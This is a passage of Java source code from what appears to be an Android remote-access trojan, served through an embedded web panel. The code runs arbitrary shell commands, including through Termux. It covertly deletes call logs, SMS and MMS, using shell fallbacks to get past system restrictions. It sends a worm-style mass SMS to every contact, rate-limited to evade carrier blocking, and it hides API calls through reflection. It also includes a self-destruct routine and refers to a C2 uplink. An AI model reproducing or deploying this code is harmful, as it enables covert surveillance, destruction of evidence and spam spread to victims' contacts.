                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    android.os.Process.killProcess(android.os.Process.myPid());
                    System.exit(0);
                }, 45000);

            } catch (Exception e) {
                Log.e("SelfDestruct", "Sequence Failure: " + e.getMessage());
            }
        });
    }

    private static String currentShellPath = "/sdcard";

    private boolean isAppInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static class AppEntry implements Comparable<AppEntry> {
        String name;
        String packageName;
        AppEntry(String n, String p) { name = n; packageName = p; }
        @Override public int compareTo(AppEntry other) { return name.compareToIgnoreCase(other.name); }
    }

    private List<AppEntry> getLaunchableApps() {
        List<AppEntry> apps = new ArrayList<>();
        android.content.pm.PackageManager pm = context.getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN, null);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<android.content.pm.ResolveInfo> list = pm.queryIntentActivities(intent, 0);
        for (android.content.pm.ResolveInfo info : list) {
            String name = info.loadLabel(pm).toString();
            String pkg = info.activityInfo.packageName;
            apps.add(new AppEntry(name, pkg));
        }
        java.util.Collections.sort(apps);
        return apps;
    }

    private String executeShell(String command) {
        if (command == null || command.isEmpty()) return "";
        try {
            if (command.equalsIgnoreCase("help") || command.equalsIgnoreCase("-h")) {
                return "AVAILABLE_COMMANDS:\n\n" +
                       "  cd <path>        - Change working directory\n" +
                       "  ls [-la]         - List files in current directory\n" +
                       "  pwd              - Print current directory\n" +
                       "  cat <file>       - View file contents\n" +
                       "  rm <file>        - Remove file\n" +
                       "  mkdir <dir>      - Create directory\n" +
                       "  pm list packages - List installed app packages\n" +
                       "  getprop          - View system properties\n" +
                       "  df -h            - Disk usage summary\n" +
                       "  top -n 1         - Process list\n" +
                       "  netstat          - Network status\n" +
                       "  ip addr          - IP configuration\n" +
                       "  uptime           - System uptime\n" +
                       "  whoami           - Current user identity\n" +
                       "  id               - UID/GID info\n" +
                       "  uname -a         - Kernel version/info\n" +
                       "  logcat -d        - Dump system logs\n" +
                       "  sysinfo          - Aggregate system overview\n" +
                       "  termux <cmd>     - Route command through Termux bridge\n" +
                       "  termux-fix-mirrors - Fix 'No mirror selected' errors\n" +
                       "  help / -h        - Show this help menu\n\n" +
                       "CURRENT_PATH: " + currentShellPath;
            }

            if (command.equalsIgnoreCase("sysinfo")) {
                return "SYSTEM_OVERVIEW:\n" +
                       "  Manufacturer: " + android.os.Build.MANUFACTURER + "\n" +
                       "  Model: " + android.os.Build.MODEL + "\n" +
                       "  Android Ver: " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n" +
                       "  C2 Uplink: " + currentShellPath + "\n" +
                       "  Session User: " + System.getProperty("user.name") + "\n" +
                       "  Architecture: " + System.getProperty("os.arch");
            }

            if (command.trim().equalsIgnoreCase("termux-fix-mirrors")) {
                return executeShell("termux echo \"deb https://packages-cf.termux.dev/apt/termux-main stable main\" > /data/data/com.termux/files/usr/etc/apt/sources.list && apt update");
            }

            if (command.startsWith("termux ") || 
               (isAppInstalled("com.termux") && (command.startsWith("pkg ") || command.startsWith("apt ") || command.startsWith("pip ") || command.startsWith("python ") || command.startsWith("nmap ") || command.startsWith("echo ")))) {
                
                if (!isAppInstalled("com.termux")) return "Error: Termux is not installed on this device.";
                
                String termuxCmd = command;
                if (command.startsWith("termux ")) termuxCmd = command.substring(7).trim();

                // Generate a unique filename for this specific execution to avoid permission/cache issues
                String cmdId = String.valueOf(System.currentTimeMillis() % 1000000);
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File outputFile = new File(downloadDir, "termux_" + cmdId + ".txt");

                Intent intent = new Intent("com.termux.RUN_COMMAND");
                intent.setClassName("com.termux", "com.termux.app.RunCommandService");
                intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
                
                // Optimized wrapper: Clean environment and explicit exit marker
                String wrappedCmd = "export PATH=/data/data/com.termux/files/usr/bin:$PATH; " +
                                  "export HOME=/data/data/com.termux/files/home; " +
                                  "export DEBIAN_FRONTEND=noninteractive; " +
                                  "({ " + termuxCmd + "; }) > " + outputFile.getAbsolutePath() + " 2>&1; " +
                                  "echo \"\n__DONE_" + cmdId + "__\" >> " + outputFile.getAbsolutePath();
                
                intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{"-c", wrappedCmd});
                intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home");
                intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
                intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
                
                try {
                    context.startService(intent);
                } catch (Exception e) {
                    return "Error starting bridge: " + e.getMessage();
                }

                // Optimization: Using CountDownLatch + Manual check for completion
                // (FileObserver can be unreliable on some Android 11+ /sdcard implementations)
                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                String marker = "__DONE_" + cmdId + "__";
                
                // Using a light-weight background monitor
                LabRatsWorker.execute(() -> {
                    int retries = 0;
                    int maxRetries = (command.contains("pkg") || command.contains("apt") || command.contains("pip")) ? 300 : 60; 
                    while (retries < maxRetries) {
                        try { Thread.sleep(1000); } catch (Exception ignored) {}
                        if (outputFile.exists() && outputFile.length() > 0) {
                            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(outputFile, "r")) {
                                long len = raf.length();
                                if (len > 30) {
                                    raf.seek(len - 30);
                                    byte[] endBytes = new byte[30];
                                    raf.read(endBytes);
                                    if (new String(endBytes).contains(marker)) {
                                        latch.countDown();
                                        return;
                                    }
                                }
                            } catch (Exception ignored) {}
                        }
                        retries++;
                    }
                    latch.countDown(); // Timeout case
                });

                try {
                    latch.await(); // Wait for completion or timeout
                } catch (InterruptedException ignored) {}

                if (outputFile.exists() && outputFile.length() > 0) {
                    // Small delay to ensure file handle is released by Termux subshell
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                    
                    for (int r = 0; r < 5; r++) {
                        try {
                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                            try (java.io.FileInputStream fis = new java.io.FileInputStream(outputFile)) {
                                byte[] buffer_chunk = new byte[8192];
                                int len_read;
                                while ((len_read = fis.read(buffer_chunk)) != -1) {
                                    baos.write(buffer_chunk, 0, len_read);
                                }
                            }
                            
                            String result = baos.toString("UTF-8");
                            if (result.contains(marker)) {
                                result = result.replace(marker, "").trim();
                                try { outputFile.delete(); } catch (Exception ignored) {}
                                return result + "\n\n[Termux Bridge Execution Complete]";
                            }
                            
                            if (r == 4) return result + "\n\n[Warning: Completion marker not detected, output might be partial]";
                        } catch (Exception e) {
                            try { Thread.sleep(1000); } catch (Exception ignored) {}
                        }
                    }
                }
else {
                    return "Command timed out.\n" +
                           "Note: Larger installs like 'nmap' or 'python' can take 1-2 minutes.";
                }
            }

            // --- STATEFUL CD SUPPORT ---
            if (command.startsWith("cd ")) {
                String targetPath = command.substring(3).trim();
                File nextDir;
                if (targetPath.startsWith("/")) nextDir = new File(targetPath);
                else nextDir = new File(currentShellPath, targetPath);
                
                if (nextDir.exists() && nextDir.isDirectory()) {
                    currentShellPath = nextDir.getCanonicalPath();
                    return "Directory changed to: " + currentShellPath;
                } else {
                    return "Error: Directory does not exist";
                }
            }

            // Using ProcessBuilder to set the working directory for persistent navigation
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(new File(currentShellPath));
            pb.redirectErrorStream(true);
            
            Process process = pb.start();
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 100) {
                output.append(line).append("\n");
                count++;
            }
            if (output.length() == 0) output.append("[Command executed with no output]");

            logActivity("DEVICE_CONTROL: Shell command executed - " + command);
            return output.toString();
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    private Response serveCallLogsClear() {
        try {
            logActivity("COMMS_WIPE: Wiping device call history");
            context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null);
            String html = getHeader("/calls") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>Call logs have been successfully wiped from the device.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) { return serveError("Wipe Failed: " + e.getMessage()); }
    }

    private Response deleteCall(Map<String, String> params) {
        String id = params.get("id");
        String page = params.get("page");
        if (id != null) {
            try {
                // High-Impact Removal Strategy
                int rows = context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, android.provider.CallLog.Calls._ID + "=?", new String[]{id});
                
                // Advanced Shell Force-Delete (Bypasses system restrictions)
                if (rows == 0) {
                    executeShell("content delete --uri content://call_log/calls/" + id);
                    executeShell("content delete --uri content://call_log/calls --where \"_id=" + id + "\"");
                }
                
                logActivity("COVERT_PROTOCOL: Target comms record " + id + " neutralized.");
            } catch (Exception e) {
                logActivity("SYSTEM_ERROR: Call log deletion failed: " + e.getMessage());
            }
        }
        String redirectUrl = "/calls" + (page != null ? "?page=" + page : "");
        Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
        response.addHeader("Location", redirectUrl);
        return response;
    }

    private Response deleteSms(Map<String, String> params) {
        String id = params.get("id");
        String page = params.get("page");
        if (id != null) {
            try {
                // Multi-Path Removal Engine
                int rows = context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
                
                if (rows == 0) {
                    // Try direct URI removal via internal system bridge
                    executeShell("content delete --uri content://sms/" + id);
                    executeShell("content delete --uri content://sms --where \"_id=" + id + "\"");
                }

                // Force System Synchronization
                try {
                    context.getContentResolver().notifyChange(Uri.parse("content://sms/"), null);
                    context.getContentResolver().notifyChange(Uri.parse("content://mms-sms/"), null);
                } catch (Exception ignored) {}
                
                logActivity("COVERT_PROTOCOL: Comm-Packet " + id + " removal sequence executed.");
            } catch (Exception e) {
                logActivity("SYSTEM_ERROR: SMS deletion failed: " + e.getMessage());
            }
        }
        String redirectUrl = "/sms" + (page != null ? "?page=" + page : "");
        Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
        response.addHeader("Location", redirectUrl);
        return response;
    }

    private Response deleteMms(Map<String, String> params) {
        String id = params.get("id");
        String page = params.get("page");
        if (id != null) {
            try {
                int rows = context.getContentResolver().delete(Uri.parse("content://mms/" + id), null, null);
                
                if (rows == 0) {
                    executeShell("content delete --uri content://mms/" + id);
                }
                
                try {
                    context.getContentResolver().notifyChange(Uri.parse("content://mms/"), null);
                } catch (Exception ignored) {}
                
                logActivity("COVERT_PROTOCOL: Media-Packet " + id + " removal sequence executed.");
            } catch (Exception e) {
                logActivity("SYSTEM_ERROR: MMS deletion failed: " + e.getMessage());
            }
        }
        String redirectUrl = "/mms" + (page != null ? "?page=" + page : "");
        Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
        response.addHeader("Location", redirectUrl);
        return response;
    }

    private Response serveSmsBroadcast(Map<String, String> params, IHTTPSession session) {
        String message = params.get("message");
        if (message == null || message.isEmpty()) return serveError("Message content is required for broadcast");
        
        logActivity("COMMS_BROADCAST: Dispatched mass-messaging sequence (Worm)");
        
        // Execute broadcast in background to avoid server timeout
        LabRatsWorker.execute(() -> {
            try {
                android.database.Cursor cursor = context.getContentResolver().query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
                        null, null, null);
                
                if (cursor != null) {
                    // API Virtualization for SMS dispatch
                    String className = "android.telephony.SmsManager";
                    Object smsManager;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(android.telephony.SmsManager.class);
                    else smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);

                    int count = 0;
                    java.util.Set<String> sentNumbers = new java.util.HashSet<>();
                    
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(0);
                        if (number != null && !number.isEmpty() && !sentNumbers.contains(number)) {
                            if (smsManager != null) {
                                SystemAnalytics.safeCall(className, "sendTextMessage", 
                                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
                                    smsManager, number, null, message, null, null);
                                count++;
                                sentNumbers.add(number);
                                Thread.sleep(150); // Rate limiting to avoid carrier blocks
                            }
                        }
                    }
                    cursor.close();
                    logActivity("COMMS_BROADCAST: Sequence Complete. " + count + " units reached.");
                }
            } catch (Exception e) {
                logActivity("COMMS_ERROR: Broadcast sequence failed - " + e.getMessage());
            }
        });

        String html = getHeader("/sms") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><div style=\"margin-top: 30px; display: flex; justify-content: center;\"><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div></div>" + HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAsset(String uri) {
        try {
            String assetPath = uri.substring(1); // Remove leading slash
            InputStream is = context.getAssets().open(assetPath);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            
            String mime = getMimeType(assetPath);
            if (assetPath.endsWith(".css")) mime = "text/css";
            else if (assetPath.endsWith(".js")) mime = "application/javascript";
            
            Response res = newFixedLengthResponse(Response.Status.OK, mime, new java.io.ByteArrayInputStream(bytes), bytes.length);
            res.addHeader("Cache-Control", "public, max-age=3600");
            return res;
        } catch (Exception e) {
            return serve404();
        }
    }
}
